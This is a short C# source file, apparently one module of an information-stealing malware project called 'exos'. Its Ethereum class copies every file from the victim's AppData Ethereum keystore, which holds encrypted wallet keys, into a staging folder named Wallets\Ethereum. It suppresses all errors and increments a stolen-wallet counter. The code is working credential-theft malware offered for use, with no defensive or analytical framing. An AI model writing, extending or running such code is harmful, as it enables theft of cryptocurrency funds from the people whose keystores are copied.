using System.IO;

namespace exos;

internal class Ethereum
{
	public static int count = 0;

	public static string EthereumDir = "\\Wallets\\Ethereum\\";

	public static void EcoinStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\Ethereum\\keystore").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + EthereumDir);
				fileInfo.CopyTo(directorypath + EthereumDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
